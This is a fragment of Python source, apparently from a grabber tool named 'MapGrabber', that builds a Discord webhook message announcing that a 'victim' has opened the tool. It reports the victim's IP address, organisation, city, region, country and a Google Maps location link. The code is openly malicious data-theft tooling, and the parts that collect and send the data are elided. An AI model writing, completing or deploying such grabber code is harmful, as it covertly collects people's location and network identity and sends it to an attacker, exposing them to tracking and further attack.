    ...
    def finish(self):
        ...
        embed = {
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* opend the tool!',
                        'url': '',  
                        'icon_url': ''
                    },
                    'color': 16119101,
                    'description': f'[victims location]({googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {ip.replace(" ", "᠎ ") if ip else "N/A"}
                                Domain:᠎ {org.replace(" ", "᠎ ") if org else "N/A"}
                                City:᠎ {city.replace(" ", "᠎ ") if city else "N/A"}
                                Region:᠎ {region.replace(" ", "᠎ ") if region else "N/A"}
                                Contry:᠎ {country.replace(" ", "᠎ ") if country else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                    ...
                    'footer': {
                        'text': '!  💙・MapGrabber  |  ECC client  |  Made By Spcat  !'
                    }
                }
            ]
        }
